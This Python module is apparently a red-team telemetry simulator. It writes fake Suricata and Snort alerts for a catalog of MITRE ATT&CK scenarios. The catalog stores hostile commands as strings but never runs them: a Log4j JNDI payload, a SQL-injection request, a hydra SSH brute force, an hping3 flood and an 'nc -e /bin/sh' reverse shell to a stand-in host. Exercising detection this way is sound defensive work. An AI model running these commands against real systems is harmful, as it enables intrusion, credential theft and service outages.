"""
dashboard/attack_simulator.py
Red Team Live Attack Scenario Emulator & Telemetry Injection Engine.
Provides 1-click execution of realistic attack scenarios adhering to MITRE ATT&CK v19.2
and repository baseline SID allocations (Suricata 9000000-9099999, Snort 9100000-9199999).
"""

from __future__ import annotations

import json
import os
import random
from datetime import UTC, datetime, timedelta
from pathlib import Path
from typing import Any

from pydantic import BaseModel, Field

REPO_ROOT = Path(__file__).resolve().parent.parent
SURICATA_LOG = Path(os.getenv("SURICATA_EVE_PATH", REPO_ROOT / "logs" / "suricata" / "eve.json"))
SNORT_LOG = Path(os.getenv("SNORT_ALERT_PATH", REPO_ROOT / "logs" / "snort" / "alert_json.txt"))


class AttackScenario(BaseModel):
    id: str
    name_ko: str
    name_en: str
    category: str
    tactic: str
    technique_id: str
    technique_name: str
    cve: str | None = None
    severity: str
    severity_level: int
    suricata_sid: int
    snort_sid: int
    suricata_sig: str
    snort_sig: str
    attacker_ip: str
    target_ip: str
    target_port: int
    protocol: str
    payload_command: str
    description: str


class LaunchRequest(BaseModel):
    scenario_id: str
    intensity: int = Field(default=3, ge=1, le=20)
    live_inject: bool = True


class SimulationResult(BaseModel):
    status: str
    scenario_id: str
    scenario_name: str
    technique_id: str
    technique_name: str
    tactic: str
    attacker_ip: str
    target_ip: str
    target_port: int
    suricata_sid: int
    snort_sid: int
    alerts_generated: int
    timestamp: str
    suricata_log_path: str
    snort_log_path: str
    details: list[dict[str, Any]] = []


SCENARIOS_CATALOG: list[AttackScenario] = [
    AttackScenario(
        id="recon_nmap",
        name_ko="Nmap 스텔스 포트 스캔 (NULL/FIN/XMAS)",
        name_en="Nmap Stealth Abnormal Flag Port Scan",
        category="Reconnaissance",
        tactic="Reconnaissance",
        technique_id="T1046",
        technique_name="Network Service Discovery",
        severity="MEDIUM",
        severity_level=2,
        suricata_sid=9000001,
        snort_sid=9100020,
        suricata_sig="SOC-SCAN: Nmap Stealth NULL Scan Detected (Zero Flags)",
        snort_sig="SNORT-SCAN: Nmap Stealth NULL Scan (No Flags)",
        attacker_ip="10.77.20.20",
        target_ip="10.77.30.20",
        target_port=80,
        protocol="TCP",
        payload_command="nmap -sN -p 22,80,443,3000,8080 -T4 10.77.30.20",
        description="공격자가 방화벽 필터링을 우회하기 위해 TCP 플래그가 모두 0(NULL)인 비정상 패킷을 전송하여 오픈 포트를 탐색합니다.",
    ),
    AttackScenario(
        id="web_sqli",
        name_ko="웹 SQL 인젝션 공격 (UNION SELECT 기반)",
        name_en="Web SQL Injection (UNION SELECT Pattern)",
        category="Initial Access",
        tactic="Initial Access",
        technique_id="T1190",
        technique_name="Exploit Public-Facing Application",
        severity="HIGH",
        severity_level=3,
        suricata_sid=9010001,
        snort_sid=9100010,
        suricata_sig="SOC-ATTACK: Web SQL Injection - UNION SELECT Pattern Attempt",
        snort_sig="SNORT-ATTACK: Web SQL Injection UNION SELECT Pattern Attempt",
        attacker_ip="10.77.20.20",
        target_ip="10.77.30.20",
        target_port=3000,
        protocol="TCP",
        payload_command="curl -k -G 'http://10.77.30.20:3000/rest/products/search' --data-urlencode 'q=apple\\' UNION SELECT 1,2,3,database()--'",
        description="웹 파라미터 유효성 검증 결함을 악용하여 UNION SELECT 구문으로 백엔드 데이터베이스 스키마 및 민감 데이터를 탈취 시도합니다.",
    ),
    AttackScenario(
        id="log4j_rce",
        name_ko="Apache Log4j JNDI 원격 코드 실행 (RCE)",
        name_en="Apache Log4j JNDI Remote Code Execution Exploit",
        category="Initial Access",
        tactic="Initial Access",
        technique_id="T1190",
        technique_name="Exploit Public-Facing Application",
        cve="CVE-2021-44228",
        severity="CRITICAL",
        severity_level=4,
        suricata_sid=9010040,
        snort_sid=9100013,
        suricata_sig="SOC-ATTACK: Remote Code Execution - Apache Log4j JNDI Exploit Attempt (${jndi:})",
        snort_sig="SNORT-ATTACK: Apache Log4j JNDI RCE Exploit Attempt (${jndi:})",
        attacker_ip="10.77.20.20",
        target_ip="10.77.30.20",
        target_port=8080,
        protocol="TCP",
        payload_command="curl -H 'User-Agent: ${jndi:ldap://198.51.100.44:1389/Exploit}' http://10.77.30.20:8080/api/v1/health",
        description="취약한 Log4j2 라이브러리의 JNDI 룩업 취약점을 악용하여 악성 LDAP 서버로부터 바이트코드를 다운로드해 원격 명령을 실행합니다.",
    ),
    AttackScenario(
        id="ssh_bruteforce",
        name_ko="고빈도 SSH 무차별 대입 공격 (Brute Force)",
        name_en="High-Frequency SSH Credential Brute Force",
        category="Credential Access",
        tactic="Credential Access",
        technique_id="T1110.001",
        technique_name="Password Guessing",
        severity="HIGH",
        severity_level=3,
        suricata_sid=9020001,
        snort_sid=9100025,
        suricata_sig="SOC-ANOMALY: High-Frequency SSH Connection Threshold Exceeded (Potential Brute Force Attempt)",
        snort_sig="SNORT-ATTACK: SSH Brute Force Rate Exceeded",
        attacker_ip="10.77.20.20",
        target_ip="10.77.30.20",
        target_port=22,
        protocol="TCP",
        payload_command="hydra -l root -P /usr/share/wordlists/rockyou.txt -t 8 ssh://10.77.30.20",
        description="SSH 인증 포트(22/TCP)에 대해 사전 공격 툴을 이용해 초당 다수의 로그인 인증을 시도하여 임계치 임팩트를 유발합니다.",
    ),
    AttackScenario(
        id="c2_reverse_shell",
        name_ko="비표준 고위 포트 대화형 리버스 셸 연결",
        name_en="Interactive High-Port Reverse Shell C2 Session",
        category="Command and Control",
        tactic="Command and Control",
        technique_id="T1059.004",
        technique_name="Unix Shell",
        severity="CRITICAL",
        severity_level=4,
        suricata_sid=9030010,
        snort_sid=9100030,
        suricata_sig="SOC-MALWARE: Potential Interactive Reverse Shell Session (/bin/sh Prompt on High Port)",
        snort_sig="SNORT-MALWARE: Potential Interactive Reverse Shell /bin/sh Output",
        attacker_ip="198.51.100.44",
        target_ip="10.77.30.20",
        target_port=4444,
        protocol="TCP",
        payload_command="nc -e /bin/sh 198.51.100.44 4444",
        description="피해 서버에서 외부 C2 서버(198.51.100.44:4444)로 아웃바운드 역접속 세션을 생성하여 원격 셸 권한을 획득합니다.",
    ),
    AttackScenario(
        id="syn_flood",
        name_ko="L4 TCP SYN 플러드 서비스 거부 공격 (DoS)",
        name_en="L4 TCP SYN / ICMP Flood Denial-of-Service",
        category="Impact",
        tactic="Impact",
        technique_id="T1498.001",
        technique_name="Direct Network Flood",
        severity="HIGH",
        severity_level=3,
        suricata_sid=9000021,
        snort_sid=9100002,
        suricata_sig="SOC-ATTACK: ICMP Ping Flood Denial of Service Attempt",
        snort_sig="SNORT-ATTACK: ICMP Ping Flood Denial of Service",
        attacker_ip="10.77.20.20",
        target_ip="10.77.30.20",
        target_port=80,
        protocol="TCP",
        payload_command="hping3 -c 1000 -d 120 -S -w 64 -p 80 --flood 10.77.30.20",
        description="SYN 패킷을 대량 전송하여 대상 시스템의 TCP 백로그 큐를 고갈시키고 정상적인 서비스 요청을 거부 상태로 유도합니다.",
    ),
]


class AttackSimulatorEngine:
    def __init__(
        self,
        eve_log_path: Path = SURICATA_LOG,
        snort_log_path: Path = SNORT_LOG,
    ) -> None:
        self.eve_log_path = eve_log_path
        self.snort_log_path = snort_log_path
        self.history: list[SimulationResult] = []

    def get_catalog(self) -> list[AttackScenario]:
        return SCENARIOS_CATALOG

    def get_scenario(self, scenario_id: str) -> AttackScenario | None:
        for s in SCENARIOS_CATALOG:
            if s.id == scenario_id:
                return s
        return None

    def launch_scenario(self, req: LaunchRequest) -> SimulationResult:
        return self.launch(req.scenario_id, intensity=req.intensity, live_inject=req.live_inject)

    def launch(self, scenario_id: str, intensity: int = 3, live_inject: bool = True) -> SimulationResult:
        scenario = self.get_scenario(scenario_id)
        if not scenario:
            raise ValueError(f"Unknown attack scenario ID: {scenario_id}")

        now = datetime.now(UTC)
        details = []

        if live_inject:
            self.eve_log_path.parent.mkdir(parents=True, exist_ok=True)
            self.snort_log_path.parent.mkdir(parents=True, exist_ok=True)

            with open(self.eve_log_path, "a", encoding="utf-8") as f_eve, \
                 open(self.snort_log_path, "a", encoding="utf-8") as f_snort:

                for i in range(intensity):
                    event_time = now + timedelta(seconds=i * 2)
                    iso_time = event_time.isoformat()
                    src_port = random.randint(32768, 61000)
                    flow_id = random.randint(100000000000000, 999999999999999)

                    # 1. Suricata EVE JSON Record
                    eve_record: dict[str, Any] = {
                        "timestamp": iso_time,
                        "flow_id": flow_id,
                        "event_type": "alert",
                        "src_ip": scenario.attacker_ip,
                        "src_port": src_port,
                        "dest_ip": scenario.target_ip,
                        "dest_port": scenario.target_port,
                        "proto": scenario.protocol,
                        "alert": {
                            "action": "allowed",
                            "gid": 1,
                            "signature_id": scenario.suricata_sid,
                            "rev": 2,
                            "signature": scenario.suricata_sig,
                            "category": scenario.category,
                            "severity": scenario.severity_level,
                            "metadata": {
                                "attack_technique": [scenario.technique_id],
                                "stage": [scenario.tactic],
                            },
                        },
                    }

                    if "http" in scenario.payload_command.lower() or scenario.target_port in (80, 443, 3000, 8080):
                        eve_record["http"] = {
                            "hostname": "victim-shop.local",
                            "url": "/api/v1/service",
                            "http_user_agent": "Mozilla/5.0 (Aegis-RedTeam-Simulator)",
                            "http_method": "POST" if "hydra" in scenario.payload_command else "GET",
                        }

                    f_eve.write(json.dumps(eve_record, ensure_ascii=False) + "\n")

                    # 2. Snort 3 Alert Record
                    snort_record = {
                        "timestamp": iso_time,
                        "pkt_num": random.randint(100, 50000),
                        "proto": scenario.protocol,
                        "src_addr": scenario.attacker_ip,
                        "src_ap": f"{scenario.attacker_ip}:{src_port}",
                        "dst_addr": scenario.target_ip,
                        "dst_ap": f"{scenario.target_ip}:{scenario.target_port}",
                        "msg": scenario.snort_sig,
                        "sid": scenario.snort_sid,
                        "gid": 1,
                        "rev": 2,
                        "class": scenario.category,
                        "priority": scenario.severity_level,
                    }
                    f_snort.write(json.dumps(snort_record, ensure_ascii=False) + "\n")

                    details.append({
                        "iteration": i + 1,
                        "timestamp": iso_time,
                        "flow_id": flow_id,
                        "src_port": src_port,
                    })

        result = SimulationResult(
            status="SUCCESS",
            scenario_id=scenario.id,
            scenario_name=f"{scenario.name_ko} ({scenario.name_en})",
            technique_id=scenario.technique_id,
            technique_name=scenario.technique_name,
            tactic=scenario.tactic,
            attacker_ip=scenario.attacker_ip,
            target_ip=scenario.target_ip,
            target_port=scenario.target_port,
            suricata_sid=scenario.suricata_sid,
            snort_sid=scenario.snort_sid,
            alerts_generated=intensity,
            timestamp=now.isoformat(),
            suricata_log_path=str(self.eve_log_path),
            snort_log_path=str(self.snort_log_path),
            details=details,
        )

        self.history.append(result)
        return result

    def get_history(self, limit: int = 20) -> list[SimulationResult]:
        return list(reversed(self.history[-limit:]))


attack_simulator_engine = AttackSimulatorEngine()
